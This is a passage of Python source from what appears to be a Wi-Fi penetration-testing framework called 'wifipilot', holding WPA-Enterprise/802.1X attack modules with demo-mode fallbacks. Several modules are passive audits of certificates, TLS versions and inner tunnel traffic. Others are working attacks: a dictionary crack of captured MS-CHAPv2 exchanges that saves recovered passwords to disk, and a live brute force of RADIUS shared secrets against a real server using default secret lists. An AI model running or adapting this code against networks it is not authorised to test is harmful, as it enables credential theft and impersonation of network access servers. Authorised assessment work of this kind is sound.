                   "and judge it: expiry, signature algorithm, key size, and whether the "
                   "subject names the network the client thought it was joining.  A "
                   "private CA is not automatically a finding; an expired one, a "
                   "1024-bit one, or a SHA-1 signature is, and this proves it from a "
                   "capture without transmitting anything.")
    noise = "silent"
    impact = "info"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        path = self.tls_capture(ctx, ap)
        missing = self._read_or_skip(ctx, ap, attempt, path, "an EAP-TLS ServerHello")
        if missing is not None:
            return missing
        certs = self._demo_certificates(ap) if ctx.demo else certificates(path)
        if not certs:
            ctx.session.end_attempt(attempt, "failed", "no certificate in the capture")
            return AttackOutcome.failed(
                "no certificate in the capture",
                f"{path}: the TLS handshake never reached a Certificate message (a TLS "
                f"1.3 handshake encrypts it, which is a good sign, not a failure)")
        problems: List[str] = []
        for cert in certs:
            algorithm = (cert.get("signature_algorithm") or "").lower()
            if any(weak in algorithm for weak in WEAK_SIGNATURES):
                problems.append(f"{cert['signature_algorithm']} signature")
            bits = int(cert.get("public_key_bits") or 0)
            if bits and bits < MIN_RSA_BITS:
                problems.append(f"{bits}-bit key")
            expiry = _ascii_time(cert.get("not_after", ""))
            if expiry and expiry < datetime.now(timezone.utc):
                problems.append(f"expired {cert.get('not_after')}")
            subject = (cert.get("subject") or "").lower()
            if ap.essid and ap.essid.lower() not in subject and \
                    not any(word in subject for word in ("radius", "corp", "lab",
                                                         "wifi", "802")):
                problems.append(f"subject {cert.get('subject')!r} does not name the "
                                f"network")
        detail = (f"{len(certs)} certificate(s) read: "
                  + ", ".join(cert.get("subject") or "(no subject)"
                              for cert in certs[:4]))
        detail += ("; " + "; ".join(problems)) if problems else "; no problems found"
        return self._finish(ctx, ap, attempt,
                            f"certificate audit: {len(certs)} certificate(s)"
                            + (f", {len(problems)} problem(s)" if problems else ""),
                            detail,
                            {"certificates": certs[:6], "problems": problems,
                             "capture": path, "simulated": ctx.demo},
                            severity="high" if problems else "info",
                            finding={"title": "RADIUS certificate problems: "
                                              + "; ".join(problems),
                                     "detail": detail,
                                     "severity": "high"} if problems else None)

    def _demo_certificates(self, ap: AccessPoint) -> List[Dict[str, Any]]:
        """A certificate with the flaws the audit is supposed to find, some of the time."""
        from .. import synth

        seed = int(ap.bssid.replace(":", ""), 16)
        bits = 1024 if seed % 4 == 0 else (4096 if seed % 7 == 0 else 2048)
        algorithm = ("1.2.840.113549.1.1.5" if seed % 5 == 0
                     else "1.2.840.113549.1.1.11")
        after = "241130000000Z" if seed % 3 == 0 else "270103000000Z"
        common_name = f"radius{seed % 7}.corp.example"
        der = synth.build_test_certificate(common_name=common_name,
                                           organization="Example Corp", bits=bits,
                                           not_after=after,
                                           signature_algorithm=algorithm)
        return [certificate_details(der)]


# --------------------------------------------------------------------------- #
# 4. TTLS/PEAP inner conversation
# --------------------------------------------------------------------------- #


class TtlsInnerAuditAttack(_EnterpriseBase):
    name = "ttls_inner_audit"
    label = "TTLS/PEAP inner conversation audit"
    tool = "wifipilot (EAP-in-TLS decoder)"
    description = ("Read the conversation inside a captured TTLS or PEAP tunnel: the "
                   "inner method the server demanded, the identity the client sent "
                   "there, and any attribute the server leaked in cleartext.  TTLS in "
                   "cleartext mode, or PEAP with the wrong inner method, is visible to "
                   "anyone who can open the outer tunnel — which on MS-CHAPv2 means "
                   "anyone who has cracked one password.")
    noise = "silent"
    impact = "info"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        path = self.inner_capture(ctx, ap)
        missing = self._read_or_skip(ctx, ap, attempt, path,
                                     "a TTLS/PEAP tunnel")
        if missing is not None:
            return missing
        conversations: List[Dict[str, Any]] = []
        avps: List[Dict[str, str]] = []
        if ctx.demo:
            seed = int(ap.bssid.replace(":", ""), 16)
            conversations.append({
                "outer": next((packet.get("method_text") for packet in
                               eap_packets(path) if packet.get("method") in
                               (21, 25, 43, 52)), "PEAP"),
                "inner": {"method_text": "MSCHAPv2" if seed % 2 else "GTC",
                          "identity": f"svc-vpn@{'corp' if seed % 2 else 'lab'}.example"},
                "identity": f"svc-vpn@{'corp' if seed % 2 else 'lab'}.example"})
            if seed % 2:
                avps = [{"attribute": "Tunnel-Private-Group-Id", "value": "42"},
                        {"attribute": "Filter-Id", "value": "vpn-full"}]
        else:
            seen: Dict[str, Dict[str, Any]] = {}
            for frame in _capture_frames(path):
                eapol = _eapol_llc(frame)
                if not eapol or len(eapol) < 5 or eapol[1] != 0:
                    continue
                outer = _eap_fields(eapol[4:])
                if outer.get("method") not in (21, 25, 43, 52):
                    continue
                for record in tls_records(outer.get("tls") or b""):
                    for kind, body in _handshake_messages(record["body"]):
                        inner = _inner_eap(body)
                        if not inner:
                            continue
                        identity = inner.get("identity", "")
                        key = identity or inner.get("method_text", "")
                        seen[key] = {"outer": outer.get("method_text", ""),
                                     "inner": inner, "identity": identity}
                        avps = cleartext_avps(body) or avps
            conversations = list(seen.values())
            if not conversations:
                ctx.session.end_attempt(attempt, "failed", "no readable inner EAP")
                return AttackOutcome.failed(
                    "no readable inner EAP",
                    f"{path}: EAP-TTLS/PEAP frames were present but no inner EAP packet "
                    f"was readable — the tunnel was not decrypted (a certificate-only "
                    f"outer method never exposes one)")
        detail = "inner: " + ", ".join(
            f"{item['inner'].get('method_text', '?')}"
            + (f" as {item['identity']}" if item.get("identity") else "")
            for item in conversations[:5])
        if avps:
            detail += (f"; {len(avps)} cleartext attribute(s): "
                       + ", ".join(f"{avp['attribute']}={avp['value']}"
                                   for avp in avps[:4]))
        leaks = [avp for avp in avps if avp["attribute"].lower() in
                 ("user-password", "user-name", "state", "chap-password")]
        return self._finish(ctx, ap, attempt,
                            f"inner conversation: {len(conversations)} exchange(s)"
                            + (f", {len(leaks)} leak(s)" if leaks else ""),
                            detail,
                            {"conversations": conversations[:8], "avps": avps,
                             "capture": path, "simulated": ctx.demo},
                            severity="high" if leaks else "info",
                            finding={"title": "Credentials visible inside the tunnel: "
                                              + ", ".join(avp["attribute"]
                                                          for avp in leaks),
                                     "detail": detail,
                                     "severity": "high"} if leaks else None)


def _inner_eap(payload: bytes) -> Dict[str, Any]:
    """The EAP packet inside a decrypted TTLS/PEAP inner payload, if there is one."""
    offset = 0
    while offset + 4 <= len(payload):
        code = payload[offset]
        length = int.from_bytes(payload[offset + 2:offset + 4], "big")
        if code in (EAP_REQUEST, EAP_RESPONSE, EAP_SUCCESS, EAP_FAILURE) and \
                4 <= length <= len(payload) - offset:
            fields = _eap_fields(payload[offset:offset + length])
            if fields and (fields.get("method") or fields.get("identity")):
                return fields
        offset += 1
    return {}


# --------------------------------------------------------------------------- #
# 5. MS-CHAPv2
# --------------------------------------------------------------------------- #


class Mschapv2CrackAttack(_EnterpriseBase):
    name = "mschapv2_crack"
    label = "MS-CHAPv2 challenge/response recovery"
    tool = "wifipilot (MD4 + DES, RFC 2759)"
    description = ("Turn a captured MS-CHAPv2 exchange into its ChallengeHash, NT hash "
                   "and 24-byte response, then try a dictionary: the DES keys come from "
                   "the NT hash, so a matching password proves itself against the "
                   "captured response.  The whole attack is arithmetic on a capture that "
                   "already exists — no deauthenticate, no fake AP, and the resulting "
                   "credential is the pair the response will verify.")
    category = "offline"
    noise = "silent"
    impact = "loot"
    requires = ()
    # every byte it needs is already in the capture: no radio, no injection
    needs_injection = False

    def material(self, ctx: AttackContext, ap: AccessPoint) -> Dict[str, Any]:
        """The challenge/response pair, from a capture or the demo synth."""
        path = self.capture_path(ctx, ap)
        if path:
            found = self._from_capture(path)
            if found:
                return found
        if not ctx.demo:
            return {}
        # demo: build the exchange with the real RFC 2759 arithmetic, then read it back
        from .. import synth

        target = os.path.join(ctx.session.state_dir, "captures",
                              f"demo-mschapv2-{ap.bssid.replace(':', '')}.pcap")
        if not os.path.exists(target):
            os.makedirs(os.path.dirname(target), exist_ok=True)
            synth.build_mschapv2_capture(target, essid=ap.essid or "CorpNet-8021X",
                                         bssid=ap.bssid, username="jdoe",
                                         password="clientPass")
        return self._from_capture(target) or {}

    def _from_capture(self, path: str) -> Dict[str, Any]:
        found: Dict[str, Any] = {"challenge": b"", "peer_challenge": b"",
                                 "response": b"", "username": "", "identities": []}
        for packet in eap_packets(path):
            identity = packet.get("identity")
            if identity and identity not in found["identities"]:
                found["identities"].append(identity)
            data = packet.get("mschap") or {}
            if data.get("code") == 1 and data.get("challenge"):
                found["challenge"] = data["challenge"]
                found["session"] = data.get("session", b"")
            elif data.get("code") == 2 and data.get("response"):
                found["peer_challenge"] = data.get("peer_challenge", b"")
                found["response"] = data["response"]
                found["username"] = data.get("name") or found.get("username") or "User"
        if found["challenge"] and found["response"]:
            return found
        # a capture may carry the exchange as an unlabelled PEAP payload: scan bytes
        return {}

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        material = self.material(ctx, ap) or {}
        challenge = material.get("challenge") or b""
        peer = material.get("peer_challenge") or b""
        response = material.get("response") or b""
        username = material.get("username") or "User"
        if len(challenge) < 16 or len(response) != 24:
            ctx.session.end_attempt(attempt, "skipped", "no MS-CHAPv2 pair")
            return AttackOutcome.skipped(
                "no MS-CHAPv2 material",
                f"{ap.display_name}: no 24-byte response in the capture — capture the "
                f"inner EAP-MSCHAPv2 exchange (or set `enterprise_capture`) first")
        challenge = challenge[:16]
        peer = (peer or bytes(16))[:16]
        challenge_hash = mschapv2_challenge_hash(challenge, peer, username)
        hashes = {"username": username, "challenge": challenge.hex(),
                  "peer_challenge": peer.hex(), "response": response.hex(),
                  "challenge_hash": challenge_hash.hex(),
                  "md4_challenge_hash": md4(challenge_hash).hex(),
                  "nt_hash": nt_hash("").hex(),
                  "jtr": f"$NETNTLM${username}::{challenge_hash.hex()}::"
                         f"{response.hex()}:::"}
        words = self._passwords(ctx)
        # the ChallengeHash covers the user name as the supplicant sent it, and the
        # Name in the Response is not always it: try every name the capture offers
        names: List[str] = []
        for candidate in [username, *material.get("identities", []), "User"]:
            if candidate and candidate not in names:
                names.append(candidate)
        recovered = ""
        used_name = names[0]
        tried = 0
        started = time.time()
        for word in words:
            tried += 1
            for name in names:
                if mschapv2_verify(word, challenge, peer, name, response):
                    recovered, used_name = word, name
                    break
            if recovered:
                break
        username = used_name
        taken = max(time.time() - started, 1e-6)
        rate = tried / taken
        if not recovered:
            return self._finish(ctx, ap, attempt, "no password matched",
                                f"{tried} candidate(s) in {taken:.2f}s ({rate:,.0f}/s) "
                                f"against the captured response; the NETNTLM line is "
                                f"in the extras for a real cracker",
                                {"hashes": hashes, "tried": tried, "rate": rate,
                                 "simulated": ctx.demo}, severity="medium")
        detail = (f"password {recovered!r} for {username!r}: {tried} candidate(s) in "
                  f"{taken:.2f}s ({rate:,.0f}/s)")
        path = os.path.join(ctx.session.state_dir, "creds",
                            f"mschapv2-{ap.bssid.replace(':', '')}.txt")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(f"# MS-CHAPv2 recovery from {ap.essid or ap.bssid}\n"
                         f"username={username}\npassword={recovered}\n"
                         f"challenge={challenge.hex()}\n"
                         f"peer_challenge={peer.hex()}\n"
                         f"response={response.hex()}\n"
                         f"challenge_hash={challenge_hash.hex()}\n")
        return self._finish(ctx, ap, attempt,
                            f"MS-CHAPv2 password recovered: {recovered}", detail,
                            {"password": recovered, "username": username,
                             "hashes": hashes, "tried": tried, "rate": rate,
                             "record": path, "simulated": ctx.demo},
                            severity="critical",
                            finding={"title": f"MS-CHAPv2 password recovered for "
                                              f"{username!r}",
                                     "detail": detail, "severity": "critical"})

    def _passwords(self, ctx: AttackContext) -> List[str]:
        words: List[str] = []
        if ctx.demo:
            return ["winter", "Password1", "clientPass", "Summer2024!"]
        for path in getattr(ctx.config, "wordlists", []) or []:
            if not path or not os.path.exists(path):
                continue
            try:
                with open(path, "r", encoding="utf-8", errors="replace") as handle:
                    for line in handle:
                        word = line.rstrip("\r\n")
                        if word:
                            words.append(word)
                        if len(words) >= 100_000:
                            break
            except OSError:
                continue
            if words:
                break
        words += ["", "password", "123456", "clientPass"]
        seen: List[str] = []
        for word in words:
            if word not in seen:
                seen.append(word)
        return seen


# --------------------------------------------------------------------------- #
# 6. RADIUS shared secret
# --------------------------------------------------------------------------- #


class RadiusSecretTestAttack(_EnterpriseBase):
    name = "radius_secret_test"
    label = "RADIUS shared-secret test"
    tool = "wifipilot netproto (own RADIUS client)"
    description = ("Send a real Access-Request to the RADIUS server with candidate "
                   "shared secrets and check the Response Authenticator (RFC 2865 §3): "
                   "only the secret that is actually configured produces a matching "
                   "digest.  A default or guessable secret lets anyone who can reach the "
                   "server issue Accept messages, and it also decrypts the User-Password "
                   "attribute of every request it carries.")
    noise = "quiet"
    impact = "info"
    requires = ()

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        server = str(getattr(ctx.config, "radius_server", "") or "")
        if ctx.demo:
            server = server or "192.0.2.10"
        if not server:
            ctx.session.end_attempt(attempt, "skipped", "no radius server configured")
            return AttackOutcome.skipped(
                "no RADIUS server", f"{ap.display_name}: set `radius_server` to the "
                                    f"authenticator's address (the AP's own address is "
                                    f"the usual answer)")
        candidates = self._secrets(ctx)
        budget = min(self.budget(ctx, 45.0), 180.0)
        verified = ""
        tried = 0
        exchanges: List[Dict[str, Any]] = []
        if ctx.demo:
            seed = int(ap.bssid.replace(":", ""), 16)
            verified = candidates[seed % len(candidates)]
            tried = len(candidates)
            exchanges.append({"server": server, "code": "Access-Accept"})
        else:
            deadline = time.time() + budget
            for secret in candidates:
                if time.time() > deadline or ctx.want_stop():
                    break
                tried += 1
                code, ok = self._try(server, secret, ctx)
                if code:
                    exchanges.append({"server": server, "secret": "*" * len(secret),
                                      "code": code, "verified": ok})
                if ok:
                    verified = secret
                    break
            if not verified:
                ctx.session.end_attempt(attempt, "failed", "no candidate worked")
                return AttackOutcome.failed(
                    "no candidate secret worked",
                    f"{tried} candidate(s) against {server}: "
                    + (f"the server answered ({exchanges[-1]['code']}) but no "
                       f"authenticator matched, so the secret is not in the list"
                       if exchanges else
                       f"nothing answered on UDP 1812/1645 — is the server reachable "
                       f"from this segment?"))
        path = os.path.join(ctx.session.state_dir, "creds",
                            f"radius-secret-{ap.bssid.replace(':', '')}.txt")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(f"# RADIUS shared secret for {server}\nsecret={verified}\n")
        detail = (f"shared secret {verified!r} accepted by {server} ({tried} tried)"
                  if verified else f"{tried} candidate(s) tried against {server}")
        return self._finish(ctx, ap, attempt,
                            f"RADIUS shared secret recovered: {verified}", detail,
                            {"server": server, "secret": verified, "tried": tried,
                             "exchanges": exchanges, "record": path,
                             "simulated": ctx.demo},
                            severity="high",
                            finding={"title": f"RADIUS shared secret is {verified!r}",
                                     "detail": ("a NAS that accepts requests signed with "
                                                "this secret can be impersonated, and "
                                                "the secret decrypts User-Password "
                                                "attributes on every request"),
                                     "severity": "high"})

    def _secrets(self, ctx: AttackContext) -> List[str]:
        if ctx.demo:
            return ["secret", "testing123", "wifipilot-demo"]
        configured = list(getattr(ctx.config, "radius_secrets", None) or [])
        from ..netproto import RADIUS_DEFAULT_SECRETS

        candidates = configured or list(RADIUS_DEFAULT_SECRETS)
        for extra in ("", "changeme", "password", "wireless", "wifi", "letmein"):
            if extra not in candidates:
                candidates.append(extra)
        return candidates

    def _try(self, server: str, secret: str, ctx: AttackContext) -> Tuple[str, bool]:
        """One Access-Request; returns (code text, authenticator verified)."""
        request, authenticator = radius_access_request(secret, "wifipilot-probe",
                                                       "probe", identifier=1)
        ports = getattr(ctx.config, "radius_ports", None) or (1812, 1645)
        for port in ports:
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2.5)
                sock.sendto(request, (server, int(port)))
                data, _peer = sock.recvfrom(4096)
            except (OSError, socket.timeout, ValueError):
                continue
            finally:
                if sock is not None:
                    sock.close()
            code = data[0] if data else 0
            text = {2: "Access-Accept", 3: "Access-Reject", 11: "Access-Challenge"}.get(
                code, "")
            if not text:
                continue
            return text, radius_verify_response(secret, request, bytes(data))
        return "", False


# --------------------------------------------------------------------------- #
# 7. TLS version
# --------------------------------------------------------------------------- #


class EapTlsVersionAttack(_EnterpriseBase):
    name = "eap_tls_version"
    label = "EAP-TLS version and cipher audit"
    tool = "wifipilot (TLS record parser)"
    description = ("Read the TLS version and cipher suite the authentication server "
                   "offers in its ServerHello.  A RADIUS server still starting at TLS "
                   "1.0 or offering RC4/CBC suites has a downgrade path that an active "
                   "attacker can take, and the offer is in the capture — no credential "
                   "and no association required to prove it.")
    noise = "silent"
    impact = "info"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        path = self.tls_capture(ctx, ap)
        missing = self._read_or_skip(ctx, ap, attempt, path, "an EAP-TLS ServerHello")
        if missing is not None:
            return missing
        hellos = self._demo_hellos(ap) if ctx.demo else server_hellos(path)
        if not hellos:
            ctx.session.end_attempt(attempt, "failed", "no ServerHello in the capture")
            return AttackOutcome.failed(
                "no ServerHello in the capture",
                f"{path}: no TLS ServerHello was found in the EAP exchange (TLS 1.3 "
                f"moves it into the encrypted handshake, which is the good outcome)")
        weak: List[str] = []
        for hello in hellos:
            if int(hello.get("version") or 0) in WEAK_TLS:
                weak.append(hello.get("version_text", "?"))
            if int(hello.get("cipher") or 0) in WEAK_CIPHERS:
                weak.append(hello.get("cipher_text", "?"))
        detail = ("ServerHello: " + ", ".join(
            f"{hello.get('version_text', '?')}/{hello.get('cipher_text', '?')}"
            for hello in hellos[:4]))
        detail += ("; weak: " + ", ".join(sorted(set(weak)))) if weak else \
            "; no weak versions or ciphers offered"
        return self._finish(ctx, ap, attempt,
                            f"EAP-TLS offers {hellos[0].get('version_text', '?')}"
                            + (f" with weak suites ({len(set(weak))})" if weak else ""),
                            detail,
                            {"server_hellos": hellos[:6], "weak": sorted(set(weak)),
                             "capture": path, "simulated": ctx.demo},
                            severity="medium" if weak else "info",
                            finding={"title": "Weak TLS in the 802.1X handshake: "
                                              + ", ".join(sorted(set(weak))),
                                     "detail": ("a server offering a pre-1.2 TLS version "
                                                "or a CBC/RC4 cipher suite can be walked "
                                                "down by an active attacker; require "
                                                "TLS 1.2+ and AEAD suites"),
                                     "severity": "medium"} if weak else None)

    def _demo_hellos(self, ap: AccessPoint) -> List[Dict[str, Any]]:
        from .. import synth

        seed = int(ap.bssid.replace(":", ""), 16)
        version = 0x0301 if seed % 3 else 0x0303
        cipher = 0x002F if seed % 4 else 0xC02F
        frame = synth.build_eap_tls_server_hello(ap.bssid, ap.bssid, version=version,
                                                cipher=cipher)
        return [{"version": version,
                 "version_text": TLS_VERSIONS.get(version, f"0x{version:04x}"),
                 "cipher": cipher,
                 "cipher_text": TLS_CIPHERS.get(cipher, f"0x{cipher:04x}"),
                 "record_version": TLS_VERSIONS.get(version, ""),
                 "frame_bytes": len(frame)}]


__all__ = ["CertificateAuditAttack", "EapIdentityHarvestAttack", "EapMethodProbeAttack",
           "EapTlsVersionAttack", "Mschapv2CrackAttack", "RadiusSecretTestAttack",
           "TtlsInnerAuditAttack", "build_eap_nak", "build_eapol_start",
           "certificate_details", "cleartext_avps", "eap_packets", "eap_tls_payload",
           "is_enterprise", "parse_server_hello", "tls_records"]
